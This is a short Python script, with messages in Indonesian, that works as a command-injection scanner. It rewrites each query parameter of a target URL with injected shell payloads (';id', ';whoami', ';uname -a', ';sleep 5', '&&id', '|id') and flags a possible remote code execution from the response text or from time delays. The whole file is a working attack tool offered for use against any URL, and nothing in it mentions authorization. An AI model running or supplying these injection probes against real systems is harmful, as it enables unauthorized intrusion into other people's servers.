import requests
import sys
import urllib.parse
import time

payloads = [
    ";id",
    ";whoami",
    ";uname -a",
    ";sleep 5",
    "&id",
    "&&id",
    "|id"
]

def scan_rce(url):
    parsed = urllib.parse.urlparse(url)
    query = urllib.parse.parse_qs(parsed.query)

    if not query:
        print("[!] URL tidak memiliki parameter untuk diuji.")
        return

    for param in query:
        for payload in payloads:
            mod_query = query.copy()
            mod_query[param] = payload

            new_query = urllib.parse.urlencode(mod_query, doseq=True)
            test_url = urllib.parse.urlunparse((
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                parsed.params,
                new_query,
                parsed.fragment
            ))

            print(f"[+] Menguji: {test_url}")
            start = time.time()
            try:
                response = requests.get(test_url, timeout=10)
                duration = time.time() - start
                if "uid=" in response.text or "Linux" in response.text or "root" in response.text:
                    print(f"[!!] Kemungkinan RCE terdeteksi di: {test_url}")
                elif duration > 4 and ";sleep" in payload:
                    print(f"[!!] Kemungkinan Blind RCE (sleep delay) di: {test_url}")
            except requests.exceptions.Timeout:
                print(f"[!!] Timeout - Kemungkinan Blind RCE pada {test_url}")
            except Exception as e:
                print(f"[!] Error: {e}")
            print("-" * 60)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 rce_scanner.py \"https://target.com/?test=123\"")
        sys.exit(1)
    
    target_url = sys.argv[1]
    scan_rce(target_url)
